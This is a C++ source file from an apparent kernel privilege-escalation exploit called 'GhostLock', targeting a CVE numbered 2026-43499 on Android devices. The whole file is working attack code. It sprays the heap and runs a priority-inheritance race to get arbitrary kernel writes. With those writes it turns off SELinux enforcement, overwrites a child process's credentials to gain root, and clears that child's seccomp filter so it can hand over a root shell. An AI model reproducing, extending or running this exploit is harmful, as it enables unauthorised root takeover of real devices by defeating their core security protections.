/*
 * GhostLock — cve_2026_43499 backend procedure (Batch 4, D1=B).
 *
 * The setup stage, the W1-W3 step sequence and the shared write/retry
 * primitives moved out of the retired ExploitProcedure. The middleware policy
 * is a template parameter: route hooks are direct static calls on `Middleware`
 * (Batch 4 review P1-B), so the catalogued middleware each instantiate their
 * own backend code. The body is otherwise unchanged: same statements, same
 * order, same log text.
 */

#include "backend/cve_2026_43499_backend.hpp"
#include "backend/cve_2026_43499_state.hpp"

#include "backend/cve_2026_43499/bootstrap.hpp"
#include "memory/direct_map.hpp"
#include "backend/cve_2026_43499/primitives.hpp"
#include "platform/runtime.hpp"
#include "terminal/root_script.hpp"
#include "common.h"
#include "memory/target.h"
#include "kernelsnitch/utils.h"
#include "race/threads.hpp"
#include "backend/cve_2026_43499/route/route_api.hpp"
#include "backend/cve_2026_43499/route/route_middleware.hpp"
#include "backend/cve_2026_43499/route/route_policy.hpp"
#include "terminal/handoff_probe.hpp"
#include "ancillary/ancillary_controller.hpp"
#include "backend/victim/victim_process.hpp"
#include "support/decls.hpp"
#include "support/fatal_error.hpp"
#include "support/run_state.hpp"

#include <unistd.h>

#include <cstdint>
#include <optional>
#include <utility>

namespace ghostlock::backend {
    /* The session types this unit used to see through the enclosing session
     * namespace (victim, ancillary, g_exploit_session, VictimRound, ...). */
    using namespace ghostlock::session;
    using ghostlock::session::CoreSession;
    using ghostlock::session::StageResult;
    using ghostlock::session::VictimChain;
    namespace {
        /* Shared write/retry sequence. */
        template <class M>
        Status retry_write_stage(
            CoreSession &session,
            const char *stage,
            uintptr_t target,
            int32_t mode,
            uint32_t attempts,
            useconds_t settle_usec,
            write_stage_verify_fn verify,
            void *context,
            int32_t leaf) {

            /* no attempt can move a target that is wrong by construction, and the
             * stage belongs in the log with the address rather than the route */
            if (!memory::in_direct_map(target)) {
                pr_warning("%s: target 0x%016zx is outside the direct map, not attempting\n", stage, target);
                return false;
            }

            const auto request = memory::WriteRequest::make(target, static_cast<memory::WriteMode>(mode), leaf != 0);

            for (uint32_t attempt = 1; attempt <= attempts; attempt++) {
                pr_info("%s attempt %u/%u\n", stage, attempt, attempts);

                /* the previous attempt's write can land after its verify read; check
                 * before paying for another heap spray */
                if (attempt > 1 && verify(context)) {
                    return true;
                }
                if (attempt == 1) {
                    slab_drain();
                }
                if (static_cast<memory::WriteMode>(mode) == memory::WriteMode::Credential) {
                    if (!M::w2_fast_repair_prebuild(session)) return false;
                }
                Status routed = Cve2026_43499Policy::template attack_write<M>(session, request, stage);
                if (!routed) {
                    support::discard_prebuilt_page();
                    pr_warning("%s attempt %u route failed; backing off\n", stage, attempt);
                    usleep(100000);
                    continue;
                }
                if (static_cast<memory::WriteMode>(mode) == memory::WriteMode::Credential) {
                    if (!M::w2_fast_repair_activate(session)) return false;
                }
                if (settle_usec) usleep(settle_usec);
                if (verify(context)) return true;
                usleep(50000);
            }
            /* the last write can land after its verify read */
            return verify(context) != 0;
        }

        /* W3 chain retry: park the previous rooted child on its command pipe so the
         * late-load stage can still start a root shell from it. */
        void park_retry_child(CoreSession &session, VictimChain &chain,
                              const uint32_t round, const uint32_t chain_rounds) {
            victim::VictimContext &pipes = ghostlock::backend::cve43499_state(session).victim;
            pr_warning("W3 chain retry %u/%u: parking rooted child\n",
                       round, chain_rounds);
            if (chain.child_alive && pipes.child() > 0) {
                write(pipes.cmd_write.get(), "P", 1);
                usleep(50000);
                ghostlock::backend::cve43499_state(session).parked_victim = pipes.release_child();
                ghostlock::backend::cve43499_state(session).parked_victim_cmd = std::move(pipes.cmd_write);
            } else {
                pipes.cmd_write.reset();
            }
            pipes.uid_read.reset();
            chain.child_alive = 1;
            chain.seccomp_ok = 0;
        }

        /* Spawn one victim, clear the vivo tag (when built) and write the credential.
         * Retry means the perf leak missed and the chain should respawn. */
        template <class M>
        VictimRound w2(CoreSession &session, VictimChain &chain,
                       victim::w2_stage_context &w2_context,
                       uintptr_t &child_task) {
            victim::VictimContext &pipes = ghostlock::backend::cve43499_state(session).victim;
            int32_t &child_alive = chain.child_alive;

            const auto spawned = victim::spawn_victim(pipes);
            if (!spawned) {
                pr_warning("fork failed\n");
                return VictimRound::Failed;
            }
            child_task = spawned->task;
            support::timer_mark("perf_find_task done");

            if (!child_task) {
                /* nothing rooted yet; safe to kill and burn a round */
                pr_warning("perf leak did not reproduce; retrying next round\n");
                const pid_t unrooted = pipes.release_child();
                if (unrooted > 0) {
                    kill(-unrooted, SIGKILL);
                    waitpid(unrooted, nullptr, 0);
                }

                child_alive = 0;
                pipes.cmd_write.reset();
                pipes.uid_read.reset();
                return VictimRound::Retry;
            }

            pr_info("child_pid=%d child_task=0x%016zx\n", pipes.child(), child_task);
            /* Per-task vr.ko tag removal is an ancillary behavior (VrTaskTag,
             * PostSpawn): the backend plumbs the rooted child's task and its
             * write primitive; the applicability decision and the two writes
             * live in the behavior. It must complete before W2 verify runs the
             * child's getuid(). */
            support::run_state::enter("w2b");
            {
                ancillary::AncillaryContext ancillary_context{
                    .write_available = true,
                    .read_available = false,
                    .write_zero = &Cve2026_43499Policy::template zero_word<M>,
                    .child_task = child_task,
                };
                if (!ancillary::AncillaryController<M>::apply(
                            ancillary::AncillaryStage::PostSpawn, session,
                            ancillary_context)) {
                    pr_warning("ancillary: post-spawn behavior reported failure; "
                               "continuing\n");
                }
            }
            support::run_state::complete("w2b");

            support::run_state::enter("w2a");
            Status got_root = retry_write_stage<M>(
                session, "W2: cred", child_task + ghostlock::profile::task_cred_off(), 2,
                ghostlock::backend::cve43499_state(g_exploit_session).profile.w2_attempts(),
                ghostlock::backend::cve43499_state(g_exploit_session).profile.w2_settle_us(),
                victim::verify_w2_stage, &w2_context, 0);
            if (!got_root) {
                write(pipes.cmd_write.get(), "X", 1);
                pipes.cmd_write.reset();
                pipes.uid_read.reset();
                pr_warning("W2 failed after %u rounds\n",
                           ghostlock::backend::cve43499_state(g_exploit_session).profile.w2_attempts());
                waitpid(pipes.child(), nullptr, WNOHANG);
                return VictimRound::Failed;
            }
            support::run_state::complete("w2a");
            chain.ever_rooted = 1;
            /* rooted children never exit; chain failures park (P) */
            return VictimRound::Rooted;
        }

        /* Clear TIF_SECCOMP and seccomp.mode on the rooted child. Returns true when the
         * child probe reports a filter-free fork. */
        template <class M>
        bool w3(CoreSession &session, VictimChain &chain,
                victim::w2_stage_context &w2_context,
                uintptr_t child_task) {
            victim::VictimContext &pipes = ghostlock::backend::cve43499_state(session).victim;
            int32_t &child_alive = chain.child_alive;
            int32_t &seccomp_ok = chain.seccomp_ok;

            /* W3: clear the child's seccomp filter for the independent root shell
         * (adb/shell skips). fork() re-arms TIF_SECCOMP while mode != 0, so mode
         * must be zeroed too; do both writes back-to-back with one probe
         * (real finit_module calls trip vendor root guards).
         * tcp stamps *(target) exactly, so aim straight at thread_info.flags
         * (task+0) / seccomp.mode; only the pselect fallback needs the comm
         * probe to tell [target] from [target+8]. */
            if (!platform::runtime::process_has_seccomp()) {
                pr_success("no app seccomp filter (adb/shell flow); skipping W3\n");
                seccomp_ok = 1;
                return true;
            }

            constexpr bool exact_target = M::w3_exact_target;
            victim::w3_stage_context w3_context = {
                .pipes = pipes,
                .leaf_to_target8 = !exact_target,
            };
            if (!exact_target) {
                support::run_state::enter("w3a");
                Status dir_ok = retry_write_stage<M>(
                    session, "W3-0: leaf dir", child_task + ghostlock::profile::task_comm_off(), 1, 4, 50000,
                    victim::verify_leaf_dir_stage, &w3_context, 1);
                if (!dir_ok) {
                    /* U01/S14: upstream retires the child instead of guessing the leaf
                 * direction and blind-writing the task neighbour. Returning false
                 * hands control back to the W2/W3 chain, which parks this child and
                 * spawns a fresh one for the next round. */
                    pr_warning("W3 leaf direction probe failed; retiring child\n");
                    return false;
                }
                support::run_state::complete("w3a");
            } else {
                support::run_state::complete("w3a");
            }

            uintptr_t flags_target = w3_context.leaf_to_target8
                                         ? child_task - 8
                                         : child_task + memory::TASK_THREAD_INFO_FLAGS_OFF;
            uintptr_t mode_target = w3_context.leaf_to_target8
                                        ? child_task + ghostlock::profile::task_seccomp_off() - 8
                                        : child_task + ghostlock::profile::task_seccomp_off();

            uint32_t w3_attempts = ghostlock::backend::cve43499_state(g_exploit_session).profile.w3_attempts();
            for (uint32_t attempt = 1; attempt <= w3_attempts; attempt++) {
                pr_info("W3: TIF_SECCOMP+mode attempt %u/%u\n", attempt, w3_attempts);
                if (attempt == 1) slab_drain();
                support::run_state::enter("w3b");
                const memory::WriteRequest flags_request =
                        memory::WriteRequest::make(flags_target, memory::WriteMode::Zero, 1);
                Status routed = Cve2026_43499Policy::template attack_write<M>(session, flags_request, "W3: TIF_SECCOMP");
                if (!routed) {
                    pr_warning("W3 attempt %u route failed; backing off\n", attempt);
                    usleep(100000);
                    continue;
                }
                support::run_state::complete("w3b");
                usleep(ghostlock::backend::cve43499_state(g_exploit_session).profile.w3_settle_us());
                support::run_state::enter("w3c");
                const memory::WriteRequest mode_request =
                        memory::WriteRequest::make(mode_target, memory::WriteMode::Zero, 1);
                routed = Cve2026_43499Policy::template attack_write<M>(session, mode_request, "W3: seccomp mode");
                if (!routed) {
                    pr_warning("W3 attempt %d mode route failed; backing off\n", attempt);
                    usleep(100000);
                    continue;
                }
                support::run_state::complete("w3c");
                usleep(ghostlock::backend::cve43499_state(g_exploit_session).profile.w3_settle_us());
                int32_t st = 0;
                if (waitpid(pipes.child(), &st, WNOHANG) == pipes.child()) {
                    pr_warning("W3 lost the child (status=0x%x); chain will retry\n", st);
                    pipes.mark_child_exited();
                    child_alive = 0;
                    break;
                }
                if (victim::verify_seccomp_probe_stage(&w2_context)) {
                    seccomp_ok = 1;
                    break;
                }
                usleep(ghostlock::backend::cve43499_state(g_exploit_session).profile.w3_settle_us());
            }

            if (!seccomp_ok) {
                pr_warning("W3 seccomp clear failed; ksud late-load will likely stay blocked\n");
                return false;
            }
            pr_success("child seccomp fully bypassed (forked workers run filter-free)\n");
            return true;
        }

        /* W1b: the non-resident multicast middleware repairs its private scratch
         * page before W2. The body stays here because it calls the shared write
         * primitive; whether it is needed is a capability of the middleware. */
        template <class M>
        bool w1_scratch_repair(CoreSession &session) {
            if constexpr (!M::multicast) {
                return true;
            } else {
                const profile::MulticastWaiterLayout mcast = ghostlock::backend::cve43499_state(session).profile.multicast_layout();
                const uintptr_t w1_scratch_poison =
                        (ghostlock::backend::cve43499_state(session).heap.current.base) + mcast.buffer_size.value_or(0);
                if (!support::quarantine_reclaim_sockets()) {
                    pr_warning("W1 scratch page quarantine failed\n");
                    return false;
                }
                int32_t repaired = 0;
                const uint32_t repair_attempts =
                        ghostlock::backend::cve43499_state(g_exploit_session).profile.w1_scratch_repair_attempts();
                for (uint32_t repair_try = 1; repair_try <= repair_attempts; repair_try++) {
                    pr_info("W1b: private scratch repair attempt %u/%u\n",
                            repair_try, repair_attempts);
                    const memory::WriteRequest scratch_repair = memory::WriteRequest::make(
                        w1_scratch_poison, memory::WriteMode::Zero, 1);
                    if (Cve2026_43499Policy::template attack_write<M>(
                            session, scratch_repair, "W1b: private scratch repair")) {
                        repaired = 1;
                        break;
                    }
                    usleep(50000);
                }
                if (repaired) {
                    pr_success("private scratch repaired; releasing quarantine\n");
                    support::release_quarantined_reclaim_sockets();
                    return true;
                }
                pr_warning("private scratch repair failed; keeping page quarantined\n");
                return false;
            }
        }

        /* Stage: W1 SELinux plus the middleware-specific scratch / resident repair. */
        template <class M>
        StageResult w1(CoreSession &session) {
            /* W1: disable SELinux before task discovery. untrusted_app may not be able
         * to read enforce while it is still enforcing, so attempt W1 regardless. */
            Status selinux_ok = platform::runtime::check_selinux_off();
            if (!selinux_ok) {
                if (!platform::runtime::enforce_readable()) {
                    pr_warning("SELinux enforce unreadable; assuming enforcing and running W1\n");
                }
                support::timer_mark("pre-W1 drain");
                uint32_t w1_attempts = ghostlock::backend::cve43499_state(g_exploit_session).profile.w1_attempts();
                if constexpr (M::multicast) {
                    /* a non-resident multicast write cannot safely retry a missed W1 */
                    w1_attempts = 1;
                }
                support::run_state::enter("w1a");
                selinux_ok = retry_write_stage<M>(
                    session,
                    "W1: SELinux",
                    ghostlock::backend::cve43499_state(session).addresses.data_alias(ghostlock::profile::selinux_enforcing()),
                    1, w1_attempts,
                    ghostlock::backend::cve43499_state(g_exploit_session).profile.w1_settle_us(),
                    victim::verify_selinux_stage, nullptr, 0);

                if (!selinux_ok) {
                    pr_warning("Write 1 failed\n");
                    return StageResult::Failed;
                }
                support::run_state::complete("w1a");
                support::run_state::enter("w1b");
                if (!w1_scratch_repair<M>(session)) return StageResult::Failed;
                support::run_state::complete("w1b");
                support::timer_mark("Write 1 complete");
            } else {
                pr_success("SELinux already permissive\n");
                support::run_state::complete("w1a");
                support::run_state::complete("w1b");
            }
            /* Ancillary behaviors run outside the exploit path. The call site is
             * fixed: adding a behavior changes the registry, never this block.
             * PreSpawn = SELinux is permissive and no victim exists yet, so one
             * write covers everything the run brings up, the root script's ksud
             * included. */
            {
                ancillary::AncillaryContext ancillary_context{
                    .write_available = true,
                    .read_available = false,
                    .write_zero = &Cve2026_43499Policy::template zero_word<M>,
                };
                if (!ancillary::AncillaryController<M>::apply(
                            ancillary::AncillaryStage::PreSpawn, session,
                            ancillary_context)) {
                    pr_warning("ancillary: pre-spawn behavior reported failure; "
                               "continuing\n");
                }
            }
            return StageResult::Continue;
        }
    } // namespace

    /* Stage: process setup and profile installation. */
    StageResult Cve2026_43499Policy::run_setup(CoreSession &session,
                                               const profile::kernel_offsets &decoded,
                                               const char *debug_dir, bool force_attack) {
        ghostlock::backend::cve43499_state(session).heap.init();
        support::disable_rseq_for_thread();
        memory::set_unbuffer();
        signal(SIGPIPE, SIG_IGN);
        memory::set_limit();
        ghostlock::backend::cve_2026_43499::route::reserve_standard_io();
        if (config::runtime_config_snapshot().init() != 0) {
            pr_error("runtime configuration failed errno=%d\n", errno);
            throw FatalError{};
        }
        if (debug_dir && debug_dir[0])
            config::runtime_config_snapshot().debug_dir = debug_dir;
        if (!ghostlock::backend::cve43499_state(session).profile.loaded())
            install_profile(decoded);
        /* Robustness guard: running the attack where KernelSU already owns root
         * drives the re-enforce path that panics the kernel at the first PI
         * route, and the objective is already met. Bail out cleanly instead; a
         * cold boot clears the module for a real run. The forced test skips
         * this check on purpose and relies on the root script discarding the
         * child. */
        if (!force_attack && ghostlock::terminal::ksu_root_owned()) {
            pr_warning("KernelSU already has root; skipping exploit "
                "(cold boot for a clean run, or enable the forced test)\n");
            return StageResult::Done;
        }
        terminal::write_root_script();

        const profile::kernel_offsets *iomem_values =
            ghostlock::backend::cve43499_state(session).profile.values();
        platform::runtime::apply_iomem_cache(
            config::runtime_config_snapshot().home_dir.c_str(),
            iomem_values && iomem_values->uname_r ? iomem_values->uname_r : "");
        support::log_startup_context();
        support::init_p0_profile();
        memory::pin_to_core(static_cast<size_t>(config::runtime_config_snapshot().main_cpu));
        pr_info("main thread running on cpu=%d\n", sched_getcpu());

        support::timer_reset();
        support::timer_mark("exploit start");
        return StageResult::Continue;
    }

    /* One route write: middleware resident fast path, else heap spray + PI race.
     * Shared statement order; the middleware policy decides the resident step. */
    template <class M>
    Status Cve2026_43499Policy::zero_word(uintptr_t target, const char *desc) {
        const memory::WriteRequest request =
                memory::WriteRequest::make(target, memory::WriteMode::Zero, 1);
        return attack_write<M>(g_exploit_session, request, desc);
    }

    template <class M>
    Status Cve2026_43499Policy::attack_write(CoreSession &session,
                                             const memory::WriteRequest &request,
                                             const char *desc) {
        pr_info("=== %s === target=0x%016zx mode=%d leaf=%d\n", desc,
                request.target, static_cast<int32_t>(request.mode),
                !request.preserve_child);
        if (!memory::in_direct_map(request.target)) {
            pr_warning("  target is outside the direct map, not writing\n");
            return 0;
        }

        /* Both transports write *(target) := value through the erase left-only
         * relink: waiter words are {pc = value, right = 0, left = target} and
         * the node is RED so no color fixup runs. leaf=1 is the value=0 payload. */
        support::timer_mark("  heap spray start");
        (ghostlock::backend::cve43499_state(session).heap.current.base) = support::prepare_good_kernel_page(request);
        if (!(ghostlock::backend::cve43499_state(session).heap.current.base)) {
            pr_warning("  heap spray failed\n");
            return 0;
        }

        support::timer_mark("  heap spray done");
        Status routed = ghostlock::backend::cve_2026_43499::route::middleware::run_middleware_route(session, request);

        support::timer_mark("  PI route done");
        if (!routed) {
            pr_warning("  PI route did not produce a verified write\n");
        }

        return routed;
    }

    template <class M>
    StageResult Cve2026_43499Policy::run_steps(CoreSession &session,
                                               const profile::kernel_offsets &decoded,
                                               const char *debug_dir, bool force_attack,
                                               VictimChain &chain) {
        switch (run_setup(session, decoded, debug_dir, force_attack)) {
            case StageResult::Failed:
                return StageResult::Failed;
            case StageResult::Done:
                return StageResult::Done;
            case StageResult::Continue:
                break;
        }
        switch (w1<M>(session)) {
            case StageResult::Failed:
                return StageResult::Failed;
            case StageResult::Done:
                return StageResult::Done;
            case StageResult::Continue:
                break;
        }

        /* W2+W3 as a retryable chain: a missed W3 write or probe can kill the
         * child, so respawn and redo. */
        slab_drain();
        support::timer_mark("pre-W2 drain");
        victim::w2_stage_context w2_context = {.pipes = ghostlock::backend::cve43499_state(session).victim};
        const uint32_t chain_rounds = ghostlock::backend::cve43499_state(g_exploit_session).profile.w3_chain_rounds();
        for (uint32_t round = 1; round <= chain_rounds; round++) {
            if (round > 1) park_retry_child(session, chain, round, chain_rounds);

            uintptr_t child_task = 0;
            const VictimRound rooted = w2<M>(session, chain, w2_context, child_task);
            if (rooted == VictimRound::Failed) return StageResult::Failed;
            if (rooted == VictimRound::Retry) continue;
            if (w3<M>(session, chain, w2_context, child_task)) break;
        }
        if (!chain.seccomp_ok) {
            pr_warning("W3 seccomp bypass failed after %u chain rounds; ksud late-load will likely stay blocked\n",
                       chain_rounds);
        }
        /* The terminal handoff step finishes the run. */
        return StageResult::Continue;
    }

    StageResult Cve2026_43499Policy::run(CoreSession &session,
                                         const profile::kernel_offsets &decoded,
                                         const char *debug_dir, bool force_attack,
                                         ghostlock::terminal::RootedChild &out) {
        VictimChain chain{};
        StageResult result;
        switch (decoded.route) {
            case profile::kRouteSelectStack:
                result = run_steps<ghostlock::backend::cve_2026_43499::route::SelectPolicy>(session, decoded, debug_dir, force_attack, chain);
                break;
            case profile::kRouteTcpZerocopy:
                result = run_steps<ghostlock::backend::cve_2026_43499::route::TcpPolicy>(session, decoded, debug_dir, force_attack, chain);
                break;
            case profile::kRouteMulticastWaiter:
                result = run_steps<ghostlock::backend::cve_2026_43499::route::MulticastPolicy>(session, decoded, debug_dir, force_attack, chain);
                break;
            default:
                pr_warning("no route selected in profile\n");
                return StageResult::Failed;
        }
        if (result != StageResult::Continue) return result;

        /* Transfer the rooted-child handoff out of the backend state, keeping the
         * original live/parked split: the live branch hands over the victim
         * context's command fd and releases the child; the parked branch hands
         * over the parked child's fd. uid_read moves in both cases so the
         * terminal resets it at the original point. */
        auto &state = ghostlock::backend::cve43499_state(session);
        out.alive = chain.child_alive != 0;
        out.seccomp_bypassed = chain.seccomp_ok != 0;
        out.ever_rooted = chain.ever_rooted != 0;
        out.uid_read = std::move(state.victim.uid_read);
        if (chain.child_alive) {
            out.pid = state.victim.release_child();
            out.command = std::move(state.victim.cmd_write);
            /* The old terminal reset the parked cmd fd on the live branch too. */
            state.parked_victim_cmd.reset();
        } else if (state.parked_victim > 0) {
            out.pid = state.parked_victim;
            state.parked_victim = -1;
            out.command = std::move(state.parked_victim_cmd);
        }
        return StageResult::Continue;
    }

    /* Explicit instantiations: the catalogued route policies. Callers only
     * include the header; the definitions stay in this unit. */
    template StageResult Cve2026_43499Policy::run_steps<ghostlock::backend::cve_2026_43499::route::SelectPolicy>(
        CoreSession &, const profile::kernel_offsets &, const char *, bool, VictimChain &);
    template StageResult Cve2026_43499Policy::run_steps<ghostlock::backend::cve_2026_43499::route::TcpPolicy>(
        CoreSession &, const profile::kernel_offsets &, const char *, bool, VictimChain &);
    template StageResult Cve2026_43499Policy::run_steps<ghostlock::backend::cve_2026_43499::route::MulticastPolicy>(
        CoreSession &, const profile::kernel_offsets &, const char *, bool, VictimChain &);

    template Status Cve2026_43499Policy::attack_write<ghostlock::backend::cve_2026_43499::route::SelectPolicy>(
        CoreSession &, const memory::WriteRequest &, const char *);
    template Status Cve2026_43499Policy::attack_write<ghostlock::backend::cve_2026_43499::route::TcpPolicy>(
        CoreSession &, const memory::WriteRequest &, const char *);
    template Status Cve2026_43499Policy::zero_word<ghostlock::backend::cve_2026_43499::route::SelectPolicy>(uintptr_t,
                                                                       const char *);
    template Status Cve2026_43499Policy::zero_word<ghostlock::backend::cve_2026_43499::route::TcpPolicy>(uintptr_t, const char *);
    template Status Cve2026_43499Policy::zero_word<ghostlock::backend::cve_2026_43499::route::MulticastPolicy>(uintptr_t,
                                                                          const char *);

    template Status Cve2026_43499Policy::attack_write<ghostlock::backend::cve_2026_43499::route::MulticastPolicy>(
        CoreSession &, const memory::WriteRequest &, const char *);
} // namespace ghostlock::backend
